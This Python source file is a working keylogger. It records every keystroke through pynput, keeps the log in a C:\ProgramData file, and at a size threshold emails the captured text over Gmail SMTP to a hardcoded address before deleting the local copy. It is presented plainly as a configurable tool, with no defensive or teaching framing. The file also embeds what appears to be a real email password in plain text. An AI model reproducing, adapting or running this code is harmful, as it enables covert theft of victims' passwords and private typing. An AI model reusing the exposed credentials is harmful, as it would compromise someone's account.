import os
import smtplib
import datetime
from pynput import keyboard

# ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- #
FROM_EMAIL_ADDRESS = "sambitmaity77@gmail.com"
FROM_EMAIL_PASSWORD = "Sambit..11.7@77392"
TO_EMAIL_ADDRESS = "sambitmaity77@gmail.com"
LOG_FILE_NAME = "C:\\ProgramData\\mylog.txt"
ARCHIVE_FILE_NAME = "C:\\ProgramData\\mylog_archive.txt"
INCLUDE_LOG_AS_ATTACHMENT = True
MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300
MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0
# ----------------------------- END -------------------------------- #

buffer = ""

def on_press(key):
    global buffer

    try:
        if key.char:
            if buffer and len(buffer) >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG:
                with open(LOG_FILE_NAME, "a") as output:
                    output.write(buffer)
                buffer = ""

            log_file_size = os.path.getsize(LOG_FILE_NAME)
            if log_file_size >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL:
                archive_and_email_log()

            buffer += key.char if key.char != '\r' else "\n"
    except AttributeError:
        pass

def archive_and_email_log():
    try:
        with open(LOG_FILE_NAME, "r") as input_file:
            email_body = input_file.read()

        if INCLUDE_LOG_AS_ATTACHMENT:
            with open(ARCHIVE_FILE_NAME, "w") as archive_file:
                archive_file.write(email_body)

        message = f"From: {FROM_EMAIL_ADDRESS}\nTo: {TO_EMAIL_ADDRESS}\nSubject: {os.getlogin()} - {str(datetime.datetime.now())}\n\n{email_body}"
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD)
        server.sendmail(FROM_EMAIL_ADDRESS, TO_EMAIL_ADDRESS, message)
        server.quit()

        os.remove(LOG_FILE_NAME)
    except Exception as e:
        print("Error while sending email:", e)

def main():
    # Create an empty log file if it doesn't exist
    if not os.path.exists(LOG_FILE_NAME):
        open(LOG_FILE_NAME, "w").close()

    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    main()